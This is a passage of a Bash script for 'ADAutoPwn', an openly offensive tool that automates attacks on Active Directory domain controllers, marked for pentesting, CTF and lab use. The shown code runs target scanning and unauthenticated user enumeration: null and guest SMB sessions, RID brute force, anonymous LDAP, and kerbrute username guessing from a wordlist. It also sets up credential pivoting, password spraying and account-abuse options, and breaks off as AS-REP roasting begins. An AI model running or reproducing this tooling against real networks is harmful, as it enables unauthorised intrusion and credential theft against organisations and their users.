#!/usr/bin/env bash
#
#  ADAutoPwn  —  Active Directory Automated Pwnage Framework
#  Author : c4sh3r
#  License: MIT  (authorized use only — pentesting / CTF / lab environments)
#
#  A Bash orchestrator that chains nxc/netexec, impacket, certipy, kerbrute,
#  bloodhound-python and friends to automate Active Directory assessment:
#  from the initial port scan all the way to DCSync — covering Kerberos,
#  ADCS abuse and offline cracking, printing every user, hash and step live.
#
#  Design principles:
#    * Kerberos-first authentication (works even when NTLM is disabled,
#      better OPSEC). Falls back to NTLM only when explicitly requested.
#    * Works with zero credentials (null/guest/anonymous enumeration) and
#      progressively unlocks more phases as credentials become available.
#    * Every artifact (users, hashes, tickets, loot) is saved to disk AND
#      printed to the operator in real time.
#
set -o pipefail

# ===========================================================================
#  METADATA
# ===========================================================================
readonly VERSION="1.11.0"
readonly AUTHOR="c4sh3r"
KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"

# ===========================================================================
#  TERMINAL UI  (colors + glyphs + section helpers)
# ===========================================================================
if [[ -t 1 ]] && [[ "${NO_COLOR:-0}" != "1" ]]; then
    C_RESET=$'\e[0m';  C_BOLD=$'\e[1m';   C_DIM=$'\e[2m'
    C_RED=$'\e[38;5;196m';    C_GREEN=$'\e[38;5;46m';   C_YELLOW=$'\e[38;5;226m'
    C_BLUE=$'\e[38;5;39m';    C_MAGENTA=$'\e[38;5;201m'; C_CYAN=$'\e[38;5;51m'
    C_ORANGE=$'\e[38;5;208m'; C_GREY=$'\e[38;5;245m';   C_PURPLE=$'\e[38;5;141m'
else
    C_RESET=''; C_BOLD=''; C_DIM=''; C_RED=''; C_GREEN=''; C_YELLOW=''
    C_BLUE=''; C_MAGENTA=''; C_CYAN=''; C_ORANGE=''; C_GREY=''; C_PURPLE=''
fi

G_INFO="${C_BLUE}${C_BOLD}[*]${C_RESET}"
G_OK="${C_GREEN}${C_BOLD}[+]${C_RESET}"
G_WARN="${C_YELLOW}${C_BOLD}[!]${C_RESET}"
G_ERR="${C_RED}${C_BOLD}[-]${C_RESET}"
G_RUN="${C_PURPLE}${C_BOLD}[>]${C_RESET}"
G_LOOT="${C_MAGENTA}${C_BOLD}[\$]${C_RESET}"
G_QST="${C_CYAN}${C_BOLD}[?]${C_RESET}"

LOGFILE=""   # set in main()

# strip ANSI for the plain-text logfile
_strip() { sed 's/\x1b\[[0-9;]*m//g'; }
_log()   { [[ -n "$LOGFILE" ]] && printf '%s\n' "$(echo -e "$1" | _strip)" >>"$LOGFILE"; }

info()  { echo -e "$G_INFO $1";  _log "[*] $1"; }
ok()    { echo -e "$G_OK ${C_GREEN}$1${C_RESET}"; _log "[+] $1"; }
warn()  { echo -e "$G_WARN ${C_YELLOW}$1${C_RESET}"; _log "[!] $1"; }
err()   { echo -e "$G_ERR ${C_RED}$1${C_RESET}"; _log "[-] $1"; }
run()   { echo -e "$G_RUN ${C_DIM}$1${C_RESET}"; _log "[>] $1"; }
loot()  { echo -e "$G_LOOT ${C_MAGENTA}${C_BOLD}$1${C_RESET}"; _log "[\$] $1"; }
qst()   { echo -ne "$G_QST ${C_CYAN}$1${C_RESET}"; }
detail(){ echo -e "$1"; _log "$(echo -e "$1" | _strip)"; }   # print to screen AND log (used by the final harvest dump)

section() {
    echo
    echo -e "${C_CYAN}${C_BOLD}╔══════════════════════════════════════════════════════════════════════════╗${C_RESET}"
    printf  "${C_CYAN}${C_BOLD}║${C_RESET} ${C_BOLD}%-72s${C_RESET} ${C_CYAN}${C_BOLD}║${C_RESET}\n" "$1"
    echo -e "${C_CYAN}${C_BOLD}╚══════════════════════════════════════════════════════════════════════════╝${C_RESET}"
    _log ""; _log "==== $1 ===="
}

subsection() {
    echo
    echo -e "  ${C_PURPLE}${C_BOLD}──┤ $1 ├──${C_RESET}"
    _log "  --- $1 ---"
}

hr() { echo -e "${C_GREY}    ----------------------------------------------------------------${C_RESET}"; }

banner() {
    # Modern gradient palette (true-color). Falls back to empty strings w/ --no-color.
    local g1 g2 g3 g4 g5 g6 b1 b2 acc box
    if [[ -n "$C_RESET" ]]; then
        g1=$'\e[38;2;0;255;200m';   g2=$'\e[38;2;0;225;235m'   # teal → cyan
        g3=$'\e[38;2;60;180;255m';  g4=$'\e[38;2;130;120;255m' # blue → indigo
        g5=$'\e[38;2;190;90;255m';  g6=$'\e[38;2;255;70;200m'  # violet → magenta
        b1=$'\e[38;2;255;60;120m';  b2=$'\e[38;2;255;180;60m'  # pink / amber accents
        acc=$'\e[38;2;0;255;160m';  box=$'\e[38;2;90;100;120m'
    fi
cat <<EOF

${box}    ┌────────────────────────────────────────────────────────────────┐${C_RESET}
${g1}${C_BOLD}     █████╗ ██████╗  ${g4}█████╗ ██╗   ██╗████████╗ ██████╗${C_RESET}
${g1}${C_BOLD}    ██╔══██╗██╔══██╗${g4}██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗${C_RESET}
${g2}${C_BOLD}    ███████║██║  ██║${g5}███████║██║   ██║   ██║   ██║   ██║${C_RESET}
${g2}${C_BOLD}    ██╔══██║██║  ██║${g5}██╔══██║██║   ██║   ██║   ██║   ██║${C_RESET}
${g3}${C_BOLD}    ██║  ██║██████╔╝${g6}██║  ██║╚██████╔╝   ██║   ╚██████╔╝${C_RESET}
${g3}${C_BOLD}    ╚═╝  ╚═╝╚═════╝ ${g6}╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝${C_RESET}
${g4}${C_BOLD}              ██████╗ ██╗    ██╗███╗   ██╗${C_RESET}   ${acc}Active Directory${C_RESET}
${g5}${C_BOLD}              ██╔══██╗██║    ██║████╗  ██║${C_RESET}   ${acc}Automated Pwnage${C_RESET}
${g5}${C_BOLD}              ██████╔╝██║ █╗ ██║██╔██╗ ██║${C_RESET}   ${acc}Framework${C_RESET}
${g6}${C_BOLD}              ██╔═══╝ ██║███╗██║██║╚██╗██║${C_RESET}
${g6}${C_BOLD}              ██║     ╚███╔███╔╝██║ ╚████║${C_RESET}   ${b2}v${VERSION}${C_RESET}
${g6}${C_BOLD}              ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝${C_RESET}
${box}    └────────────────────────────────────────────────────────────────┘${C_RESET}
       ${C_BOLD}⚡ From zero to Domain Admin — fully automated.${C_RESET}
       ${box}─────────────────────────────────────────────────────────${C_RESET}
       ${box}» crafted & weaponized by${C_RESET}  ${b1}${C_BOLD}▌${C_RESET} ${acc}${C_BOLD}c4sh3r${C_RESET} ${b1}${C_BOLD}▐${C_RESET}   ${box}«${C_RESET}
       ${box}» authorized engagements only · don't be the bad guy${C_RESET}
       ${box}─────────────────────────────────────────────────────────${C_RESET}
EOF
}

# ===========================================================================
#  GLOBAL STATE
# ===========================================================================
DC_IP=""
DOMAIN=""
DC_HOST=""          # short hostname of the DC
DC_FQDN=""          # hostname.domain
USER=""
PASS=""
HASH=""
KERB_TICKET=""      # path to the .ccache we generate
OUTDIR=""
WORDLIST="/usr/share/wordlists/rockyou.txt"
USERLIST="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
DO_CRACK=1          # crack captured hashes by default (--no-crack to disable)
DO_BLOODHOUND=1
AUTO_YES=0
SUDO_OK=0
CREDS_FILE=""       # external "user:secret" lines to seed/continue the engine
USERS_FILE=""       # external user list to merge (for spray / AS-REP)
SPRAY_GEN=0         # 1 = also spray the domain-focused wordlist ONLINE (lockout risk)
KERBEROS=1          # 1 = prefer Kerberos for authenticated ops (best default)
DCT=""              # authenticated-call target: FQDN under Kerberos, else IP
HAVE_AUTH=0         # 1 once the CURRENT credential is validated
SUDO_KEEPALIVE_PID=""
# Service capabilities, decided from the port scan — drive which techniques run
CAP_SMB=0; CAP_KERBEROS=0; CAP_LDAP=0; CAP_LDAPS=0; CAP_RPC=0; CAP_WINRM=0; CAP_ADWS=0; CAP_DNS=0
STEALTH=0           # 1 = skip noisy techniques + add jitter (OPSEC)
DO_ABUSE=0          # 1 = actually perform ACL/privilege abuse (otherwise report only)
DO_CLEANUP=0        # 1 = revert every change this tool made, then exit
ROLLBACK_FILE=""    # records undo actions for responsible cleanup
GRAPH_ZIP=""        # --graph: render a BloodHound zip to graph.html and exit
OWNED_FILE=""       # --owned: file of compromised principals to flag in the graph
NO_OPEN=0           # 1 = never auto-open the graph in a browser
PIVOT_PW='ADAutoPwn!2024#Reset'   # password set when abusing ForceChangePassword

declare -a FOUND_USERS=()
declare -a CRED_QUEUE=()          # pending creds to assess: "user|pass|hash"
declare -A SEEN_CREDS=()          # already-assessed users (avoid loops)
declare -A FOUND_SECRETS=()       # every plaintext password we recover (for spraying)
declare -A SPRAYED=()             # password→done, so we don't spray twice
# Cross-iteration memo: the pivot loop re-runs every phase for each new identity,
# but some work is wasteful to repeat. These dedup it so a re-run doesn't crack
# the same document / roast+crack the same account five times over.
declare -A CRACKED_DOCS=()        # doc basename → already cracked/attempted
declare -A TRIED_HASHES=()        # per-account (krb) or per-hash (ntlm) → already cracked-attempted
declare -A OWNED_GROUPS=()        # compromised user (lowercased) → group memberships
declare -A OWNED_ADMIN=()         # compromised user (lowercased) → 1 if privileged/admin
declare -A REQUEUED_SELF=()       # user (lc) re-assessed once after a self-group-add (no loops)
KERB_DONE=0                       # Kerberoast request runs once (SPN set is domain-wide)
# Groups that mean "this account is effectively privileged" → crown it in the summary
ADMIN_GROUP_RE='Domain Admins|Enterprise Admins|Schema Admins|Administrators|Account Operators|Backup Operators|Server Operators|Print Operators|DnsAdmins|Group Policy Creator Owners|Enterprise Key Admins|Key Admins|Domain Controllers'
DOMAIN_WL=""                      # path to the generated domain-focused wordlist

# ===========================================================================
#  HELPERS
# ===========================================================================
have() { command -v "$1" >/dev/null 2>&1; }
NXC="$(command -v nxc || command -v netexec || true)"
die() { err "$1"; exit 1; }

SUDO_PASS="${SUDO_PASS:-}"   # optional: enables fully unattended sudo (-S)

# Run a command as root using cached sudo, a supplied password, or a live prompt.
_sudo() {
    if sudo -n true 2>/dev/null; then sudo "$@"
    elif [[ -n "$SUDO_PASS" ]]; then sudo -S -p '' "$@" <<<"$SUDO_PASS"
    else sudo "$@"; fi
}

# Sanitize an identity for safe use inside a filename (no slashes, spaces,
# trailing extensions). Keeps only [A-Za-z0-9._-], trims, caps length.
_safe_name() {
    local s="$1"
    s="${s//[^A-Za-z0-9._-]/_}"      # collapse anything unsafe to '_'
    s="${s#.}"; s="${s%.}"           # no leading/trailing dot
    printf '%s' "${s:0:64}"
}

# Decide whether a token is a plausible AD account name (rejects file paths,
# wordlist filenames, blanks, separators that leaked from a grep).
_is_valid_identity() {
    local u="$1"
    [[ -z "$u" ]] && return 1
    [[ "$u" == *[/\\\ ]* ]] && return 1                      # path/space
    [[ "$u" =~ \.(txt|json|log|csv|zip|ccache|ntds)$ ]] && return 1   # filename
    [[ "$u" == "users_all" || "$u" == "users" ]] && return 1
    return 0
}

# DOMAIN/USER principal for impacket-style tools
imp_principal() { echo "${DOMAIN}/${USER}"; }

# Authentication arguments for netexec (handles kerberos / hash / pass / null)
nxc_cred_args() {
    local a=()
    if [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then
        # Reuse the TGT we already requested — most reliable, no re-auth
        a+=(-u "$USER" -k --use-kcache)
        [[ -n "$DOMAIN" ]] && a+=(-d "$DOMAIN")
    else
        [[ -n "$USER" ]] && a+=(-u "$USER")
        if   [[ -n "$HASH" ]]; then a+=(-H "$HASH")
        elif [[ -n "$PASS" ]]; then a+=(-p "$PASS")
        else a+=(-u '' -p ''); fi
        [[ -n "$DOMAIN" ]] && a+=(-d "$DOMAIN")
        [[ "$KERBEROS" == "1" && -n "$DC_FQDN" ]] && a+=(-k)
    fi
    printf '%s\n' "${a[@]}"
}

confirm() {
    [[ "$AUTO_YES" == "1" ]] && return 0
    local ans; qst "$1 [y/N] "; read -r ans
    [[ "$ans" =~ ^([Yy]|yes|si)$ ]]
}

# OPSEC jitter between noisy actions when --stealth is set
jitter() { [[ "$STEALTH" == "1" ]] && sleep "$(( (RANDOM % 4) + 2 ))"; }

# ---------------------------------------------------------------------------
#  ROLLBACK / RESPONSIBLE CLEANUP
#  We record an undo command for every change we make to the target so a
#  later `--cleanup` run can revert the environment to its original state.
#  (We deliberately do NOT touch Windows event logs / anti-forensics.)
# ---------------------------------------------------------------------------
rb_record() {  # rb_record "<human description>" "<shell command that undoes it>"
    [[ -z "$ROLLBACK_FILE" ]] && return
    printf '### %s\n%s\n' "$1" "$2" >>"$ROLLBACK_FILE"
    warn "Change tracked for rollback: $1"
}

# ---------------------------------------------------------------------------
#  CREDENTIAL QUEUE  (drives recursive pivoting)
# ---------------------------------------------------------------------------
queue_cred() {  # queue_cred <user> <password|""> <nthash|"">
    local u="$1" p="$2" h="$3"
    if ! _is_valid_identity "$u"; then
        [[ -n "$u" ]] && err "Ignoring implausible identity '$u' (looks like a path/filename)"
        return
    fi
    local key="${u,,}"
    [[ -n "${SEEN_CREDS[$key]:-}" ]] && return   # already assessed this identity
    # Also skip if it's already waiting in the queue (case-insensitive): tools
    # report names in different cases (kerbrute 'Bob' vs nxc 'bob') and
    # several sources queue the same lead, which otherwise got assessed twice.
    local q qu; for q in "${CRED_QUEUE[@]}"; do qu="${q%%|*}"; [[ "${qu,,}" == "$key" ]] && return; done
    CRED_QUEUE+=("${u}|${p}|${h}")
    loot "New identity queued for pivoting → ${C_BOLD}${u}${C_RESET}$( [[ -n "$p" ]] && echo " (password)" || echo " (NT hash)")"
}

# Record any recovered plaintext password (with its provenance) for spraying + the map
add_secret() {
    local p="$1" src="${2:-unknown source}"; [[ -z "$p" ]] && return
    [[ -n "${FOUND_SECRETS[$p]:-}" ]] && return
    FOUND_SECRETS["$p"]=1
    echo "$p" >>"$OUTDIR/found_passwords.txt"
    printf '%-30s  ⟵  %s\n' "$p" "$src" >>"$OUTDIR/credential_map.txt"
}

# Record a confirmed/working identity and how it was obtained (for the final map)
note_cred_source() { printf '%-28s  ⟵  %s\n' "$1" "$2" >>"$OUTDIR/valid_creds_map.txt"; }

# ===========================================================================
#  DEPENDENCY CHECK
# ===========================================================================
check_deps() {
    section "DEPENDENCY CHECK"
    local req=(nmap smbclient rpcclient ldapsearch ntpdate)
    local opt=(impacket-secretsdump impacket-GetUserSPNs impacket-GetNPUsers impacket-getTGT certipy bloodhound-python enum4linux-ng smbmap john hashcat)
    local missing=0

    if [[ -z "$NXC" ]]; then err "netexec/nxc NOT found (required)"; missing=1; else ok "netexec/nxc -> $NXC"; fi
    for t in "${req[@]}"; do
        if have "$t"; then ok "$t"; else err "$t (REQUIRED) not found"; missing=1; fi
    done
    for t in "${opt[@]}"; do
        if have "$t"; then ok "$t"; else warn "$t (optional) not found — that phase will be skipped"; fi
    done
    # KERBRUTE_BIN may point at a *directory* (some installs) — resolve the real
    # binary inside it, or fall back to one on PATH. Otherwise every kerbrute
    # call dies with "is a directory" and spray/userenum silently do nothing.
    if [[ -d "$KERBRUTE_BIN" ]]; then
        local _k; _k=$(find "$KERBRUTE_BIN" -maxdepth 1 -type f -iname 'kerbrute*' 2>/dev/null | head -1)
        [[ -n "$_k" ]] && { chmod +x "$_k" 2>/dev/null; KERBRUTE_BIN="$_k"; }
    fi
    [[ ! -f "$KERBRUTE_BIN" ]] && have kerbrute && KERBRUTE_BIN="$(command -v kerbrute)"
    if _kerbrute_ok; then ok "kerbrute -> $KERBRUTE_BIN"
    else warn "kerbrute not a runnable binary at $KERBRUTE_BIN → spray falls back to netexec; variant userenum skipped"; fi
    if [[ -f "$WORDLIST" ]]; then ok "password wordlist -> $WORDLIST"; else warn "wordlist $WORDLIST missing (cracking limited)"; fi

    [[ "$missing" == "1" ]] && die "Missing required dependencies. Run ./install.sh"
}

# ===========================================================================
#  SUDO  (needed for time sync + /etc/hosts)
# ===========================================================================
request_sudo() {
    section "SUDO PRIVILEGES"
    info "Sudo is used to: sync the local clock with the DC and edit /etc/hosts"
    if sudo -n true 2>/dev/null; then ok "sudo already available (passwordless/cached)"; SUDO_OK=1
    elif [[ -n "$SUDO_PASS" ]]; then
        if sudo -S -p '' -v <<<"$SUDO_PASS" 2>/dev/null; then ok "sudo granted (supplied password)"; SUDO_OK=1
        else err "Supplied sudo password rejected"; SUDO_OK=0; fi
    elif [[ -t 0 ]]; then
        qst "sudo password: "
        if sudo -v; then ok "sudo granted"; SUDO_OK=1
        else warn "sudo unavailable — /etc/hosts edits and time sync will be skipped"; SUDO_OK=0; fi
    else
        warn "No TTY and no SUDO_PASS — skipping sudo steps (pass --sudo-pass or SUDO_PASS=…)"
        SUDO_OK=0
    fi
    if [[ "$SUDO_OK" == "1" ]]; then
        ( while true; do sudo -n true 2>/dev/null; sleep 50; done ) &
        SUDO_KEEPALIVE_PID=$!
    fi
}

# ===========================================================================
#  PHASE 0 — DOMAIN CONTROLLER DISCOVERY
# ===========================================================================
phase_discovery() {
    section "PHASE 0 · DOMAIN CONTROLLER DISCOVERY"

    info "Checking connectivity to ${C_BOLD}$DC_IP${C_RESET}"
    if ping -c1 -W2 "$DC_IP" >/dev/null 2>&1; then ok "Host $DC_IP is up"
    else warn "No ICMP reply (firewall may be filtering, continuing)"; fi

    subsection "Quick scan of key AD ports (nmap)"
    local ports="53,88,135,139,389,445,464,593,636,3268,3269,5985,9389"
    run "nmap -Pn -n -p $ports --open -T4 $DC_IP"
    local nmap_out; nmap_out=$(nmap -Pn -n -p "$ports" --open -T4 "$DC_IP" 2>/dev/null)
    echo "$nmap_out" | grep -E '^[0-9]+/tcp' | while read -r line; do ok "Open port: $line"; done
    echo "$nmap_out" >"$OUTDIR/nmap_dc.txt"

    # Map open ports → capability flags (these gate later technique selection)
    echo "$nmap_out" | grep -q '^88/tcp'   && CAP_KERBEROS=1
    echo "$nmap_out" | grep -q '^445/tcp'  && CAP_SMB=1
    echo "$nmap_out" | grep -qE '^(389|3268)/tcp' && CAP_LDAP=1
    echo "$nmap_out" | grep -qE '^(636|3269)/tcp' && CAP_LDAPS=1
    echo "$nmap_out" | grep -q '^135/tcp'  && CAP_RPC=1
    echo "$nmap_out" | grep -q '^5985/tcp' && CAP_WINRM=1
    echo "$nmap_out" | grep -q '^9389/tcp' && CAP_ADWS=1
    echo "$nmap_out" | grep -q '^53/tcp'   && CAP_DNS=1

    subsection "Capability matrix (drives technique selection)"
    _cap() { [[ "$1" == "1" ]] && echo "${C_GREEN}available${C_RESET}" || echo "${C_RED}n/a${C_RESET}"; }
    echo -e "      Kerberos (88)  : $(_cap $CAP_KERBEROS)   ${C_DIM}AS-REP / Kerberoast / Kerb auth${C_RESET}"
    echo -e "      SMB (445)      : $(_cap $CAP_SMB)   ${C_DIM}shares / RID brute / SAMR enum${C_RESET}"
    echo -e "      LDAP (389)     : $(_cap $CAP_LDAP)   ${C_DIM}users/groups/ACL/LAPS/gMSA/ADCS${C_RESET}"
    echo -e "      LDAPS (636)    : $(_cap $CAP_LDAPS)"
    echo -e "      RPC (135)      : $(_cap $CAP_RPC)   ${C_DIM}rpcclient secondary enum${C_RESET}"
    echo -e "      WinRM (5985)   : $(_cap $CAP_WINRM)   ${C_DIM}remote shell if creds allow${C_RESET}"

    # Decide the authentication method from what's actually exposed
    if [[ "$KERBEROS" == "1" && "$CAP_KERBEROS" != "1" ]]; then
        KERBEROS=0
        warn "Kerberos (88) not exposed → falling back to NTLM authentication"
    fi
    [[ "$CAP_LDAP" != "1" ]] && warn "LDAP not exposed → will use SMB/RPC secondary enumeration where possible"
    [[ "$CAP_SMB"  != "1" && "$CAP_LDAP" != "1" ]] && warn "Neither SMB nor LDAP exposed — enumeration will be very limited"

    subsection "Fingerprinting hostname & domain via SMB"
    run "$NXC smb $DC_IP"
    local smb_info; smb_info=$($NXC smb "$DC_IP" 2>&1)
    echo "$smb_info" | tee -a "$LOGFILE"

    local parsed_host parsed_dom
    parsed_host=$(echo "$smb_info" | grep -oP '\(name:\K[^)]+'   | head -1)
    parsed_dom=$( echo "$smb_info" | grep -oP '\(domain:\K[^)]+' | head -1)
    # When NTLM is disabled (e.g. Kerberos-only DCs) nxc echoes the IP back as
    # name/domain — treat that as "not detected" so the LDAP fallback kicks in.
    [[ "$parsed_host" == "$DC_IP" ]] && parsed_host=""
    [[ "$parsed_dom"  == "$DC_IP" ]] && parsed_dom=""

    [[ -n "$parsed_host" ]] && { DC_HOST="$parsed_host"; ok "DC hostname: ${C_BOLD}$DC_HOST${C_RESET}"; }
    if [[ -z "$DOMAIN" && -n "$parsed_dom" ]]; then DOMAIN="$parsed_dom"; ok "Domain detected: ${C_BOLD}$DOMAIN${C_RESET}"; fi

    # Fallback: resolve domain/FQDN via LDAP rootDSE, then LDAPS certificate.
    # Works on Kerberos-only DCs where SMB fingerprinting yields nothing.
    if [[ -z "$DOMAIN" || -z "$DC_HOST" ]]; then
        subsection "Resolving domain/FQDN via LDAP rootDSE (NTLM-independent)"
        local root dnsh nctx
        root=$(ldapsearch -x -H "ldap://$DC_IP" -s base -b "" dnsHostName defaultNamingContext 2>/dev/null)
        dnsh=$(echo "$root" | grep -oiP 'dnsHostName:\s*\K\S+' | head -1)
        nctx=$(echo "$root" | grep -oiP 'defaultNamingContext:\s*\K\S+' | head -1)
        # LDAPS certificate CN as a secondary source
        if [[ -z "$dnsh" ]]; then
            dnsh=$(timeout 8 openssl s_client -connect "$DC_IP:636" 2>/dev/null </dev/null \
                   | openssl x509 -noout -subject 2>/dev/null | grep -oiP 'CN\s*=\s*\K[^,/]+' | head -1)
        fi
        if [[ -n "$dnsh" && "$dnsh" == *.* ]]; then
            DC_FQDN="$dnsh"; DC_HOST="${dnsh%%.*}"; DOMAIN="${dnsh#*.}"
            ok "Resolved via LDAP: host=${C_BOLD}$DC_HOST${C_RESET} domain=${C_BOLD}$DOMAIN${C_RESET}"
        elif [[ -n "$nctx" ]]; then
            # DC=corp,DC=local -> corp.local
            DOMAIN=$(echo "$nctx" | sed -E 's/[Dd][Cc]=//g; s/,/./g')
            ok "Domain from naming context: ${C_BOLD}$DOMAIN${C_RESET}"
        fi
    fi

    if [[ -n "$DC_HOST" && -n "$DOMAIN" && -z "$DC_FQDN" ]]; then DC_FQDN="${DC_HOST}.${DOMAIN}"; fi
    [[ -n "$DC_FQDN" ]] && ok "DC FQDN: ${C_BOLD}$DC_FQDN${C_RESET}"

    # Decide the target used for authenticated calls
    if [[ "$KERBEROS" == "1" && -n "$DC_FQDN" ]]; then
        DCT="$DC_FQDN"; ok "Authentication mode: ${C_BOLD}Kerberos${C_RESET} (target $DCT)"
    else
        DCT="$DC_IP"
        [[ "$KERBEROS" == "1" ]] && warn "Kerberos requested but FQDN unknown → falling back to NTLM (target $DCT)" && KERBEROS=0
    fi
    [[ -z "$DOMAIN" ]] && warn "Domain could not be auto-detected — supply it with -d <domain>"
}

# ===========================================================================
#  PHASE 1 — /etc/hosts + CLOCK SYNC (Kerberos prerequisite)
# ===========================================================================
phase_hosts_time() {
    section "PHASE 1 · /etc/hosts + CLOCK SYNC (Kerberos prerequisite)"

    if [[ "$SUDO_OK" == "1" && -n "$DOMAIN" ]]; then
        subsection "Updating /etc/hosts"
        local entry="$DC_IP $DC_FQDN $DOMAIN $DC_HOST"
        if [[ -n "$DC_FQDN" ]] && getent hosts "$DC_FQDN" 2>/dev/null | grep -q "^$DC_IP[[:space:]]"; then
            ok "$DC_FQDN already resolves to $DC_IP (nothing to do)"
        else
            # Drop any stale line for this IP, then add a fresh, correct one.
            # NB: we use `bash -c "… >> file"` (not a piped `tee`) because _sudo
            # feeds the sudo password on stdin, which would clobber a pipe.
            _sudo sed -i "\#^${DC_IP}[[:space:]]#d" /etc/hosts 2>/dev/null
            if _sudo bash -c "printf '%s\n' '$entry' >> /etc/hosts"; then
                ok "Appended to /etc/hosts: ${C_BOLD}$entry${C_RESET}"
                rb_record "Added /etc/hosts entry for $DOMAIN ($DC_IP)" \
                          "sudo sed -i '\\#^${DC_IP}[[:space:]]#d' /etc/hosts"
                getent hosts "$DC_FQDN" >/dev/null 2>&1 && ok "$DC_FQDN now resolves" \
                    || warn "$DC_FQDN still not resolving (check /etc/hosts manually)"
            else
                err "Failed to write /etc/hosts"
            fi
        fi
    else
        warn "No sudo or no domain: skipping /etc/hosts (add manually: $DC_IP $DC_FQDN $DOMAIN)"
    fi

    subsection "Synchronizing clock with the DC (critical for Kerberos)"
    if [[ "$SUDO_OK" == "1" ]]; then
        run "sudo ntpdate $DC_IP"
        if _sudo ntpdate "$DC_IP" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'adjust|step|offset'; then
            ok "Clock synced with the DC"
        else
            warn "ntpdate failed, retrying with -u…"
            _sudo ntpdate -u "$DC_IP" 2>&1 | tee -a "$LOGFILE" \
                && ok "Synced (-u mode)" \
                || warn "Could not sync; if Kerberos throws KRB_AP_ERR_SKEW, sync manually"
        fi
    else
        warn "No sudo: cannot sync time. On clock skew run: sudo ntpdate $DC_IP"
    fi
}

# ===========================================================================
#  PHASE 2 — UNAUTHENTICATED ENUMERATION  (null / guest / anonymous)
# ===========================================================================
phase_unauth() {
    section "PHASE 2 · UNAUTHENTICATED ENUMERATION (null / guest / anonymous)"

    subsection "SMB: null session & guest"
    run "$NXC smb $DC_IP -u '' -p ''";    $NXC smb "$DC_IP" -u '' -p '' 2>&1 | tee -a "$LOGFILE"
    run "$NXC smb $DC_IP -u guest -p ''"; $NXC smb "$DC_IP" -u 'guest' -p '' 2>&1 | tee -a "$LOGFILE"

    subsection "SMB: anonymously accessible shares"
    run "$NXC smb $DC_IP -u '' -p '' --shares"
    local sh; sh=$($NXC smb "$DC_IP" -u '' -p '' --shares 2>&1); echo "$sh" | tee -a "$LOGFILE"
    if echo "$sh" | grep -qiE 'READ|WRITE'; then
        loot "Shares reachable without credentials! saved to loot"
        echo "$sh" >"$OUTDIR/shares_anon.txt"
    fi
    have smbmap && { run "smbmap -H $DC_IP -u null -p null"; smbmap -H "$DC_IP" -u null -p null 2>&1 | tee -a "$LOGFILE"; }

    subsection "RID brute force (enumerate users without credentials)"
    run "$NXC smb $DC_IP -u '' -p '' --rid-brute 4000"
    local rb; rb=$($NXC smb "$DC_IP" -u '' -p '' --rid-brute 4000 2>&1); echo "$rb" | tee -a "$LOGFILE"
    echo "$rb" | grep -i 'SidTypeUser' | grep -oP '\\\K[^ ]+' | sort -u >"$OUTDIR/users_ridbrute.txt"
    if [[ -s "$OUTDIR/users_ridbrute.txt" ]]; then
        loot "$(wc -l <"$OUTDIR/users_ridbrute.txt") users via RID brute → users_ridbrute.txt"
        while read -r u; do echo -e "      ${C_GREEN}·${C_RESET} $u"; FOUND_USERS+=("$u"); done <"$OUTDIR/users_ridbrute.txt"
    fi

    subsection "rpcclient: enumdomusers (null session)"
    run "rpcclient -U '' -N $DC_IP -c enumdomusers"
    rpcclient -U '' -N "$DC_IP" -c 'enumdomusers' 2>&1 | tee -a "$LOGFILE" \
        | grep -oP 'user:\[\K[^\]]+' | sort -u >"$OUTDIR/users_rpc.txt"
    [[ -s "$OUTDIR/users_rpc.txt" ]] && loot "Users via rpcclient → users_rpc.txt"

    subsection "LDAP: anonymous bind"
    if [[ -n "$DOMAIN" ]]; then
        local base="dc=${DOMAIN//./,dc=}"
        run "ldapsearch -x -H ldap://$DC_IP -b '$base' -s base"
        ldapsearch -x -H "ldap://$DC_IP" -b "$base" -s base 2>&1 | head -40 | tee -a "$LOGFILE"
    fi

    subsection "enum4linux-ng (full sweep)"
    if [[ "$STEALTH" == "1" ]]; then
        info "Stealth mode: skipping enum4linux-ng (noisy)"
    elif have enum4linux-ng; then
        run "enum4linux-ng -A $DC_IP"
        enum4linux-ng -A "$DC_IP" -oJ "$OUTDIR/enum4linux" 2>&1 | tail -60 | tee -a "$LOGFILE"
    fi

    subsection "kerbrute: user validation (userenum)"
    if [[ "$STEALTH" == "1" ]]; then
        info "Stealth mode: skipping kerbrute userenum (noisy)"
    elif [[ -x "$KERBRUTE_BIN" && -n "$DOMAIN" ]]; then
        cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
        local list="$OUTDIR/users_all.txt"
        if [[ ! -s "$list" ]]; then
            if [[ -n "$USER" ]]; then
                # We already hold credentials → authenticated enum will get the real
                # user list. Skip the slow/noisy mass brute against a huge wordlist.
                info "Credentials supplied → skipping mass userenum (authenticated enum covers it)"
                list=""
            else
                # No creds at all: spray a capped username list to seed identities.
                list="$OUTDIR/_userenum_seed.txt"
                head -n 5000 "$USERLIST" 2>/dev/null >"$list"
                info "No discovered users → seeding from top 5000 of $USERLIST"
            fi
        fi
        if [[ -n "$list" && -s "$list" ]]; then
            run "$KERBRUTE_BIN userenum -d $DOMAIN --dc $DC_IP $list"
            "$KERBRUTE_BIN" userenum -d "$DOMAIN" --dc "$DC_IP" "$list" 2>&1 | tee -a "$LOGFILE" \
                | grep -i 'VALID' | grep -oP '@\K[^@]+(?=@)' >"$OUTDIR/users_valid.txt"
            [[ -s "$OUTDIR/users_valid.txt" ]] && loot "Kerberos-confirmed valid users → users_valid.txt"
        fi
    fi

    cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
    [[ -s "$OUTDIR/users_all.txt" ]] && loot "Consolidated user list → users_all.txt ($(wc -l <"$OUTDIR/users_all.txt") unique)"
}

# ===========================================================================
#  PHASE 3 — AS-REP ROASTING (no credentials required)
# ===========================================================================
# Dynamic AS-REP roasting — strategy chosen from the live situation:
#   * authenticated  → ask LDAP for DONT_REQ_PREAUTH users (no wordlist needed)
#   * have user list → roast exactly those
#   * nothing at all → capped username-spray to seed identities
phase_asreproast() {
    section "AS-REP ROASTING"
    [[ -z "$DOMAIN" ]] && { warn "No domain, skipping"; return; }
